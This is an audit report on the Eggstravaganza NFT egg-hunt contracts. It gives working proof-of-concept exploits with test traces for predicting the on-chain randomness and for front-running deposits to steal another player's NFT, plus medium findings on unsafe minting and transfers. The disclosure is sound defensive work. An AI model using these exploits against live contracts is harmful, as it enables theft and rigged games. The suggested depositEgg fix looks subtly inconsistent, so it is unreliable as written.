# Eggstravaganza_Audit_Report

## H-01.The ramdon number generation can be predicted

### Summary

The contract uses an unsafe mechanism for ` searchForEgg() `, which relies on on-chain predictable data. This data can be simulated and calculated off-chain. Attackers can simulate it successfully off-chain before submitting the transaction.



### Vulnerability Details

The vulnerability is located in the ` searchForEgg() ` function of the ` EggHuntGame.sol ` file.

```solidity
function searchForEgg() external {
    ...
    uint256 random = uint256(
        keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender, eggCounter))
    ) % 100;
    ...
}
```

` block.timestamp ` and ` block.prevrandao ` are known or predictable by the time the transaction is minted;

` msg.sender ` can be controlled by the attacker;

` eggCounter ` is either knownn or easily bruteforceable on-chain.

So the attacker can simulate the result off-chain and the decide whether to call the ` searchForEgg() ` function to successfully mint.



### Proof of Concept

#### Attack's Contract

```solidity
contract Attack{
    function simulate(uint256 timestamp, uint256 prevrandao, address sender, uint256 eggcount, uint256 threshold) public pure returns (bool) {
        uint256 random =  uint256(
            keccak256(
                abi.encodePacked(timestamp, prevrandao, sender, eggcount)
            )
        ) % 100;
        if (random < threshold){
            return true;
        }
        return false;
    }
}
```

#### Test Case

```solidity
function testPredictRandomNumber() public {
    game.startGame(10000);
    vm.startPrank(bob);
    Attack attack = new Attack();
    for(uint256 i = 0; i < 20; i++){
        vm.warp(i);
        vm.roll(i);
        bool flag = attack.simulate(block.timestamp, block.prevrandao, bob, 0, 20);
        if (flag) {
            break;
        }
    }
    game.searchForEgg();
    vm.stopPrank();
    assertEq(nft.ownerOf(1), bob);
}
```

#### Output

```bash
[PASS] testPredictRandomNumber() (gas: 449860)
Traces:
  [449860] EggGameTest::testPredictRandomNumber()
    ├─ [54131] EggHuntGame::startGame(10000 [1e4])
    │   ├─ emit GameStarted(startTime: 1, endTime: 10001 [1e4])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return] 
    ├─ [165806] → new Attack@0xE536720791A7DaDBeBdBCD8c8546fb0791a11901
    │   └─ ← [Return] 828 bytes of code
    ├─ [0] VM::warp(0)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(0)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(0, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(1)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(1)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(1, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(2)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(2)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(2, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(3)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(3)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(3, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(4)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(4)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(4, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(5)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(5)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(5, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(6)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(6)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(6, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(7)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(7)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(7, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(8)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(8)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(8, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(9)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(9)
    │   └─ ← [Return] 
    ├─ [2434] Attack::simulate(9, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::warp(10)
    │   └─ ← [Return] 
    ├─ [0] VM::roll(10)
    │   └─ ← [Return] 
    ├─ [2445] Attack::simulate(10, 0, SHA-256: [0x0000000000000000000000000000000000000002], 0, 20) [staticcall]
    │   └─ ← [Return] true
    ├─ [126671] EggHuntGame::searchForEgg()
    │   ├─ [72259] EggstravaganzaNFT::mintEgg(SHA-256: [0x0000000000000000000000000000000000000002], 1)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 1)
    │   │   └─ ← [Return] true
    │   ├─ emit EggFound(player: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 1, totalEggsFound: 1)
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [1071] EggstravaganzaNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] SHA-256: [0x0000000000000000000000000000000000000002]
    ├─ [0] VM::assertEq(SHA-256: [0x0000000000000000000000000000000000000002], SHA-256: [0x0000000000000000000000000000000000000002]) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.11ms (1.17ms CPU time)
```



### Impact

The game will lose its fairness, as attackers can obtain rewards at a very low cost.



### Recommendation

To prevent this, use a secure source of randomness like:

* Chainlink VRF
* RANDAO + user commit-reveal schemes(with proper timing separation)
* Off-chain oracles with verifiable signatures



## H-02.User's rewards may be stolen

### Summary

Under specific circumstances, attackers can steal rewards from other users.



### Vulnerability Details

The vulnerability is located in the ` depositEgg() ` function of the ` EggVault.sol ` file.

```solidity
function depositEgg(uint256 tokenId, address depositor) public {
    require(eggNFT.ownerOf(tokenId) == address(this), "NFT not transferred to vault");
    require(!storedEggs[tokenId], "Egg already deposited");
    storedEggs[tokenId] = true;
    eggDepositors[tokenId] = depositor;
    emit EggDeposited(depositor, tokenId);
}
```

Since the function does not check for a legitimate depositor, anyone can call it.

When a user is about to claim a reward, instead of calling the ` depositEggToVault() ` function, they call the ` transferFrom() ` function and then the ` depositEgg() ` function themselves. After the ` transferFrom() ` function call is completed, the attacker can perform a front-running attack by calling the ` depositEgg() ` function and the ` withdrawEgg() ` function to steal the reward.



### Proof of Concept

#### Test Case

```solidity
function testStealReward() public {
    // easy to get reward
    game.setEggFindThreshold(100);
    game.startGame(10000);
    vm.startPrank(alice);
    game.searchForEgg();
    vm.stopPrank();
    assertEq(nft.ownerOf(1), alice);

    // alice transfer
    vm.prank(alice);
    nft.transferFrom(alice, address(vault), 1);

    // bob perform a front-running attack
    vm.prank(bob);
    vault.depositEgg(1, bob);

    // alice can not withdraw
    vm.prank(alice);
    vm.expectRevert("Not the original depositor");
    vault.withdrawEgg(1);

    // bob can withdraw
    vm.prank(bob);
    vault.withdrawEgg(1);
}
```

#### Output

```bash
[PASS] testStealReward() (gas: 257348)
Traces:
  [326950] EggGameTest::testStealReward()
    ├─ [7768] EggHuntGame::setEggFindThreshold(100)
    │   └─ ← [Stop] 
    ├─ [52131] EggHuntGame::startGame(10000 [1e4])
    │   ├─ emit GameStarted(startTime: 1, endTime: 10001 [1e4])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return] 
    ├─ [124671] EggHuntGame::searchForEgg()
    │   ├─ [72259] EggstravaganzaNFT::mintEgg(ECRecover: [0x0000000000000000000000000000000000000001], 1)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ECRecover: [0x0000000000000000000000000000000000000001], tokenId: 1)
    │   │   └─ ← [Return] true
    │   ├─ emit EggFound(player: ECRecover: [0x0000000000000000000000000000000000000001], tokenId: 1, totalEggsFound: 1)
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [1071] EggstravaganzaNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] ECRecover: [0x0000000000000000000000000000000000000001]
    ├─ [0] VM::assertEq(ECRecover: [0x0000000000000000000000000000000000000001], ECRecover: [0x0000000000000000000000000000000000000001]) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::prank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return] 
    ├─ [28845] EggstravaganzaNFT::transferFrom(ECRecover: [0x0000000000000000000000000000000000000001], EggVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1)
    │   ├─ emit Transfer(from: ECRecover: [0x0000000000000000000000000000000000000001], to: EggVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], tokenId: 1)
    │   └─ ← [Stop] 
    ├─ [0] VM::prank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return] 
    ├─ [50855] EggVault::depositEgg(1, SHA-256: [0x0000000000000000000000000000000000000002])
    │   ├─ [1071] EggstravaganzaNFT::ownerOf(1) [staticcall]
    │   │   └─ ← [Return] EggVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]
    │   ├─ emit EggDeposited(depositor: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 1)
    │   └─ ← [Stop] 
    ├─ [0] VM::prank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return] 
    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  Not the original depositor)
    │   └─ ← [Return] 
    ├─ [1156] EggVault::withdrawEgg(1)
    │   └─ ← [Revert] revert: Not the original depositor
    ├─ [0] VM::prank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return] 
    ├─ [30864] EggVault::withdrawEgg(1)
    │   ├─ [26845] EggstravaganzaNFT::transferFrom(EggVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], SHA-256: [0x0000000000000000000000000000000000000002], 1)
    │   │   ├─ emit Transfer(from: EggVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 1)
    │   │   └─ ← [Stop] 
    │   ├─ emit EggWithdrawn(withdrawer: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 1)
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.56ms (655.00µs CPU time)
```



### Impact

User's rewards may be stolen.



### Recommendation

Add logic to check whether the caller is the depositor, and move the ` transferFrom() ` function into this function.

```solidity
function depositEgg(uint256 tokenId, address depositor) public {
    // add logic to check caller
    require(eggNFT.ownerOf(tokenId) == msg.sender, "Caller is not the owner");
    // transferFrom
    eggNFT.transferFrom(msg.sender, address(eggVault), tokenId);
    require(eggNFT.ownerOf(tokenId) == address(this), "NFT not transferred to vault");
    require(!storedEggs[tokenId], "Egg already deposited");
    storedEggs[tokenId] = true;
    eggDepositors[tokenId] = depositor;
    emit EggDeposited(depositor, tokenId);
}
```



## M-01.Vault owner can change NFT address leading to players that can not deposit or withdraw their eggs

### Summary

The vault owner can set a new ` eggNFT ` contract address.Players that still have egg NFTs in the old ` eggNFT ` contract won't be able to deposit and withdraw them.



### Vulnerability Details

The vulnerability is located in the ` setEggNFT() ` function of the ` EggVault.sol ` file.

```solidity
function setEggNFT(address _eggNFTAddress) external onlyOwner {
    require(_eggNFTAddress != address(0), "Invalid NFT address");
    eggNFT = EggstravaganzaNFT(_eggNFTAddress);
}
```



### Impact

The user's rewards will be at risk of loss.



### Recommendation

1. Use a storage variable that keeps track of the number of deposited eggs and only allows to change the NFT address if that variable is 0.
2. Use a mapping to store the supported NFT addressed.The old ones are not removed, and new addressed can be added.



## M-02.Unsafe minting in mintEgg function

### Summary

The contract exposes a vulnerability by using the ` _mint() ` function directly instead of the ` safeMint() ` function in the ` mintEgg() ` function.

The issue can result in unsafe minting, potentially causing problems such as being minted to invalid addressed or incompatible contracts.



### Vulnerability Details

The vulnerability is located in the ` mintEgg() ` function of the ` EggstravaganzaNFT.sol ` file.

``` solidity
function mintEgg(address to, uint256 tokenId) external returns (bool) {
    ...
    _mint(to, tokenId);
    ...
}
```

This function uses the ` _mint() ` function directly, which does not check for the safety of minting tokens to arbitrary addressed or addressed that may not be able to handle the NFT.



### Impact

- Token Loss: If an NFT is minted to a contract address that cannot handle the token (e.g., a contract that does not implement the ` IERC721Receiver ` interface), the minted token may be lost.
- Security Risks: The direct use of _mint exposes the contract to potential issues with minting to malicious or invalid addresses, which could have unforeseen consequences.
- Reduced Interoperability: The absence of safe checks limits the contract's compatibility with other applications or contracts that expect NFTs to be safely transferable.



### Recommendation

Use the ` safeMint() ` function:

```solidity
function mintEgg(address to, uint256 tokenId) external returns (bool) {
    ...
    // _mint(to, tokenId);
    safeMint(to, tokenId);
    ...
}
```





## M-03.Unsafe transfer in functions

### Summary

The ` depositEggToVault ` function and the ` withdrawEgg ` function uses the ` transferFrom ` function to transfer NFTs, which does not verify if the recipient can safely receive ERC721 tokens. This could result in NFTs being irreversibly locked in contracts that do not support ERC721, leading to asset loss.



### Vulnerability Details

```solidity
eggNFT.transferFrom(msg.sender, address(eggVault), tokenId);

eggNFT.transferFrom(address(this), msg.sender, tokenId);
```



### Impact

NFTs may be sent to contracts that do not handle ERC721 tokens, resulting in permanent loss of ownership.



### Recommendation

Use the ` safeTransferFrom() ` function:

```solidity
eggNFT.safeTransferFrom(msg.sender, address(eggVault), tokenId);

eggNFT.safeTransferFrom(address(this), msg.sender, tokenId);
```



## M-04.Unlimited minting

### Summary

The `EggHuntGame.sol` contract allows participants to mint egg NFTs by calling the `searchForEgg()` function. However, there are no limits on how many times a user can call this function, and no overall cap on the number of NFTs that can be minted. This introduces a vulnerability where an attacker can mint a large number of NFTs in a short period of time, leading to inflation and undermining the value and rarity of the assets.



### Vulnerability Details

The `searchForEgg()` function allows any user to attempt to find and mint an egg NFT during an active game session. The only gating mechanism is a configurable probability (`eggFindThreshold`), which defaults to 20%. However, the function can be called repeatedly in a tight loop by the same user without restriction.



### Impact

The vulnerability can lead to inflation and undermining the value and rarity of the assets.



### Recommendation

To address the issue, consider implementing one or more of the following:

1. **Mint Cap per Player**: Limit how many eggs each address can mint per game session.
2. **Global Supply Cap**: Set a hard cap on the total number of eggs that can exist.
3. **Cooldown Periods**: Enforce a delay (e.g. 30 seconds) between `searchForEgg()` calls per user.
4. **Dynamic Difficulty**: Reduce `eggFindThreshold` as more eggs are minted, to slow inflation.
5. **Require Payment or Staking**: Make users pay a small fee or stake tokens to search, deterring spam.

